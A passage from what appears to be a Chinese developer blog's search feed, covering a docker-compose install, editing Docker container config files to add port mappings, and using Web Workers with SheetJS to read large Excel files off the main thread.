variable">-s</span><span class="token variable">)</span></span>-<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> <span class="token parameter variable">-m</span><span class="token variable">)</span></span>"</span> <span class="token parameter variable">-o</span> /usr/local/bin/docker-compose<span class="token comment"># 将可执行权限应用于二进制文件</span><span class="token function">sudo</span> <span class="token function">chmod</span> +x /usr/local/bin/docker-compose<span class="token comment"># 创建软链</span><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/bin/docker-compose /usr/bin/docker-compose<span class="token comment"># 测试是否安装成功</span><span class="token function">docker-compose</span> <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-docker已运行容器添加或修改端口映射"><a href="#5-docker已运行容器添加或修改端口映射" class="headerlink" title="5. docker已运行容器添加或修改端口映射"></a>5. docker已运行容器添加或修改端口映射</h2><h3 id="5-1-推荐方法"><a href="#5-1-推荐方法" class="headerlink" title="5.1 推荐方法"></a>5.1 推荐方法</h3><ol><li><p>查看容器的 [hash_of_the_container]值:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> inspect <span class="token punctuation">[</span>container-name<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>修改<code>hostconfig.json</code>文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#修改之前停止相关容器和docker服务</span><span class="token function">docker</span> stop <span class="token punctuation">[</span>hash_of_the_container<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">service</span> stop <span class="token function">docker</span><span class="token function">vim</span> /var/lib/docker/containers/<span class="token punctuation">[</span>hash_of_the_container<span class="token punctuation">]</span>/hostconfig.json<span class="token comment">#在 hostconfig.json 找到"PortBindings":&#123;&#125; 这个配置项</span><span class="token comment">#可以照着这个模板添加多个端口映射</span><span class="token string">"PortBindings"</span><span class="token builtin class-name">:</span><span class="token punctuation">&#123;</span>    <span class="token string">"80/tcp"</span>:<span class="token punctuation">[</span><span class="token punctuation">&#123;</span>        <span class="token string">"HostIp"</span><span class="token builtin class-name">:</span><span class="token string">""</span>,        <span class="token string">"HostPort"</span><span class="token builtin class-name">:</span><span class="token string">"8080"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>修改<code>config.v2.json</code>文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /var/lib/docker/containers/<span class="token punctuation">[</span>hash_of_the_container<span class="token punctuation">]</span>/config.v2.json<span class="token comment">#在 config.v2.json 里面找到:</span><span class="token string">"Tty"</span><span class="token builtin class-name">:</span> <span class="token boolean">true</span> <span class="token comment">#在这之前添加一个配置项 :</span><span class="token string">"ExposedPorts"</span>:<span class="token punctuation">&#123;</span><span class="token string">"80/tcp"</span>:<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>最后重启 <strong>docker</strong>的守护进程 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> <span class="token function">docker</span> restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看配置项已经修改成功</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> inspect <span class="token operator">&lt;</span>container-name<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="5-2-不推荐方法"><a href="#5-2-不推荐方法" class="headerlink" title="5.2 不推荐方法"></a>5.2 不推荐方法</h3><ul><li><em><del>将原来的容器提交成镜像，然后利用新的建立的镜像重新建立一个带有端口映射的容</del></em></li></ul>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS实现多线程</title>
      <link href="/worker/"/>
      <url>/worker/</url>
      
        <content type="html"><![CDATA[<h3 id="1-需求来源和启发"><a href="#1-需求来源和启发" class="headerlink" title="1. 需求来源和启发"></a>1. 需求来源和启发</h3><blockquote><p>昨天在公司第二次做导入功能的时候，想着界面也和第一次做的差不多，换换接口就完事的东西，</p><p>没想到最后在有前端页面的情况下只处理数据和连接整个逻辑流程就花了一天的工时。</p><p>就因为有个需求是： 可以选择<strong>excel</strong>的<em>sheet</em>和显示所选择的<em>sheet</em>中数据的条数.</p><p>第一次写的时候没考虑那么多，就直接用 <strong><a href="http://sheetjs.com/">SheetJS</a></strong> 读。</p><p>emmm…</p><p>数据小效果还不错，但是我们还做了个大表格测试，此表有3个<em>sheet</em> 每个<em>sheet</em>有<strong>10000</strong>条数据</p><p>一选文件屏幕直接卡死， （界面阻塞了好久，直接到卡到页面无响应！）</p><p>学过<strong>js</strong>的都知道它它它在浏览器上是没有多线程的概念的(⊙﹏⊙)</p><p>然后我就在想, 那能不能像Ajax那样实现异步读取勒？</p><p>想法有了，上👉<a href="https://www.google.com/">Google</a>  此处省略N个字….</p><p>最后找到了它👉 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Worker">Worker</a></p></blockquote><h3 id="2-解决方案"><a href="#2-解决方案" class="headerlink" title="2. 解决方案"></a>2. 解决方案</h3><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Worker">Worker</a>:</p><p>​Worker 接口是 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API">Web Workers API </a>的一部分，指的是一种可由脚本创建的后台任务，任务执行中可以向其创建者收发信息。要创建一个 Worker <strong>，</strong>只须调用 <code>Worker(URL) </code>构造函数，函数参数 <code>URL</code> 为指定的脚本。</p><p>Worker 也可以创建新的 Worker，当然，所有 Worker 必须与其创建者<a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">同源</a>（注意：<a href="https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/5R3B4RN4GHU">Blink</a>暂时不支持嵌套 Worker）。</p><p>【<strong>上面是官方文档说的</strong>】</p><p>再看看官方示例：</p></blockquote><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> myWorker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">'worker.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> first <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#number1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> second <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#number2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>first<span class="token punctuation">.</span><span class="token function-variable function">onchange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  myWorker<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">[</span>first<span class="token punctuation">.</span>value<span class="token punctuation">,</span>second<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Message posted to worker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// https://developer.mozilla.org/zh-CN/docs/Web/API/Worker/postMessage</span><span class="token comment">// worker.js  [文档并没看到这个，自己加上的😀] （后来发现在里面一级目录）</span>self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">[</span>firstVal<span class="token punctuation">,</span> secondVal<span class="token punctuation">]</span> <span class="token operator">=</span> data    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>firstVal<span class="token punctuation">,</span> secondVal<span class="token punctuation">)</span>    <span class="token comment">// do something...</span>    <span class="token comment">// 做完了可以告诉主线程， </span>    <span class="token comment">// 参数的话：postMessage(message: any, options?: PostMessageOptions): void;</span>    self<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'我做完了~'</span><span class="token punctuation">)</span>    <span class="token comment">// 也就可以这样， ！！！但是不可以传函数，类的话只能传实例（当然也有人做了那种将函数转成字符串再传的）</span>    self<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'我做完了~'</span><span class="token punctuation">,</span> <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">[</span>firstVal<span class="token punctuation">,</span> secondVal<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>上面的小例子可以看出，他这个是通过发送事件的方式来实现的，</p></blockquote><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token comment">// 这是Woker的</span><span class="token keyword">interface</span> <span class="token class-name">Worker</span> <span class="token keyword">extends</span> <span class="token class-name">EventTarget</span><span class="token punctuation">,</span> AbstractWorker <span class="token punctuation">&#123;</span>    <span class="token function">postMessage</span><span class="token punctuation">(</span>message<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span> transfer<span class="token operator">:</span> Transferable<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>    <span class="token function">postMessage</span><span class="token punctuation">(</span>message<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span> options<span class="token operator">?</span><span class="token operator">:</span> PostMessageOptions<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>   <span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token comment">// 还有一个是在Window下面的，也挺有意思的，下次再说哈~ 😄</span><span class="token keyword">interface</span> <span class="token class-name">Window</span><span class="token punctuation">&#123;</span><span class="token function">postMessage</span><span class="token punctuation">(</span>message<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span> targetOrigin<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> transfer<span class="token operator">?</span><span class="token operator">:</span> Transferable<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>    <span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token comment">// Window.postMessage 还可以跨页面（例如不同`HTML`页面）通信的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>话不多说直接上代码</strong></li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// index.js 【其实我这是用Vue写的】</span><span class="token keyword">export</span> <span class="token keyword">default</span><span class="token punctuation">&#123;</span>    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>          <span class="token literal-property property">worker</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>          <span class="token operator">...</span>      <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token function">created</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">'js/readFileWork.js'</span><span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>worker<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 这是业务代码</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>type<span class="token punctuation">,</span> result<span class="token punctuation">&#125;</span> <span class="token operator">=</span> data        <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">case</span> <span class="token string">'sheet-length'</span><span class="token operator">:</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>sheetLength <span class="token operator">=</span> result            <span class="token keyword">break</span>          <span class="token keyword">case</span> <span class="token string">'excel-info'</span><span class="token operator">:</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>sheetNames <span class="token operator">=</span> result<span class="token punctuation">.</span>SheetNames            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">selectSheet</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">//默认选择第一条</span>            <span class="token keyword">break</span>          <span class="token keyword">case</span> <span class="token string">'error'</span><span class="token operator">:</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$errorMsg</span><span class="token punctuation">(</span><span class="token string">'操作Excel异常!'</span><span class="token punctuation">)</span>            console<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">'[warn]操作Excel异常! message: '</span> <span class="token operator">+</span> result<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>reading <span class="token operator">=</span> <span class="token boolean">false</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function">beforeDestroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>worker<span class="token punctuation">)</span> <span class="token keyword">return</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>worker<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'destroy'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>worker<span class="token punctuation">.</span><span class="token function">terminate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token literal-property property">methods</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>      <span class="token function">startReadFile</span><span class="token punctuation">(</span><span class="token parameter">file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>          <span class="token literal-property property">file</span><span class="token operator">:</span> file<span class="token punctuation">.</span>raw<span class="token punctuation">,</span>          <span class="token literal-property property">rABS</span><span class="token operator">:</span> <span class="token boolean">false</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>reading <span class="token operator">=</span> <span class="token boolean">true</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>worker<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'getExcelInfo'</span><span class="token punctuation">,</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function">getSheetLength</span><span class="token punctuation">(</span><span class="token parameter">sheetName</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>worker<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'getSheetLength'</span><span class="token punctuation">,</span> <span class="token literal-property property">payload</span><span class="token operator">:</span> sheetName<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><ul><li>看一下<code>readFileWork.js</code></li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>self<span class="token punctuation">.</span><span class="token constant">XLSX</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 加载工具</span>  self<span class="token punctuation">.</span><span class="token function">importScripts</span><span class="token punctuation">(</span><span class="token string">'../js/xlsx.full.min.js'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> runtimeFactory <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token function">_finished</span><span class="token punctuation">(</span><span class="token parameter">type<span class="token punctuation">,</span> result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    type <span class="token operator">=</span> type <span class="token operator">||</span> <span class="token string">'finish'</span>    self<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>type<span class="token punctuation">,</span> result<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token function">_bin2str</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> w <span class="token operator">=</span> <span class="token number">10240</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> data<span class="token punctuation">.</span>byteLength <span class="token operator">/</span> w<span class="token punctuation">;</span> <span class="token operator">++</span>l<span class="token punctuation">)</span>      o <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>l <span class="token operator">*</span> w<span class="token punctuation">,</span> l <span class="token operator">*</span> w <span class="token operator">+</span> w<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    o <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>l <span class="token operator">*</span> w<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> o  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token function">_readFile</span><span class="token punctuation">(</span><span class="token parameter">payload<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>file<span class="token punctuation">,</span> rABS<span class="token punctuation">&#125;</span> <span class="token operator">=</span> payload<span class="token punctuation">;</span>    <span class="token keyword">const</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    reader<span class="token punctuation">[</span>rABS <span class="token operator">?</span> <span class="token string">'readAsArrayBuffer'</span> <span class="token operator">:</span> <span class="token string">'readAsBinaryString'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span>    reader<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token parameter">ev</span> <span class="token operator">=></span> callback <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span>ev<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">,</span> ev<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token function">getExcelInfo</span><span class="token punctuation">(</span><span class="token parameter">payload</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>rABS<span class="token punctuation">&#125;</span> <span class="token operator">=</span> payload    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>self<span class="token punctuation">.</span><span class="token constant">XLSX</span><span class="token punctuation">)</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Require Import SheetJS! More Information:http://sheetjs.com'</span><span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_readFile</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token parameter">result</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>SheetNames<span class="token punctuation">,</span> Sheets<span class="token punctuation">&#125;</span> <span class="token operator">=</span> rABS        <span class="token operator">?</span> self<span class="token punctuation">.</span><span class="token constant">XLSX</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token function">btoa</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_bin2str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'base64'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token operator">:</span> self<span class="token punctuation">.</span><span class="token constant">XLSX</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'binary'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_finished</span><span class="token punctuation">(</span><span class="token string">'excel-info'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>SheetNames<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>Sheets <span class="token operator">=</span> Sheets    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token function">getSheetLength</span><span class="token punctuation">(</span><span class="token parameter">sheetName</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> sheetLength <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token comment">//解析单元格范围</span>      <span class="token keyword">const</span> sheet <span class="token operator">=</span> self<span class="token punctuation">.</span>Sheets<span class="token punctuation">[</span>sheetName<span class="token punctuation">]</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>sheet<span class="token punctuation">)</span> <span class="token keyword">return</span>      <span class="token keyword">const</span> range <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token constant">XLSX</span><span class="token punctuation">.</span>utils<span class="token punctuation">.</span><span class="token function">decode_range</span><span class="token punctuation">(</span>sheet<span class="token punctuation">[</span><span class="token string">'!ref'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">//获取行数（数据条数不包含表头）</span>      sheetLength <span class="token operator">=</span> range<span class="token punctuation">.</span>e<span class="token punctuation">.</span>r <span class="token operator">-</span> range<span class="token punctuation">.</span>s<span class="token punctuation">.</span>r    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span>      sheetLength <span class="token operator">=</span> <span class="token number">0</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_finished</span><span class="token punctuation">(</span><span class="token string">'sheet-length'</span><span class="token punctuation">,</span> sheetLength<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>type<span class="token punctuation">,</span> payload<span class="token punctuation">&#125;</span> <span class="token operator">=</span> data    <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token string">'destroy'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      self<span class="token punctuation">.</span>Sheets <span class="token operator">=</span> <span class="token keyword">null</span>      self<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> registeredTypeList <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token string">'getExcelInfo'</span><span class="token punctuation">,</span>      <span class="token string">'getSheetLength'</span>    <span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>registeredTypeList<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Unsupported Message!'</span><span class="token punctuation">)</span>    runtimeFactory<span class="token punctuation">[</span>type<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>runtimeFactory<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    self<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token literal-property property">result</span><span class="token operator">:</span> e<span class="token punctuation">.</span>message<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 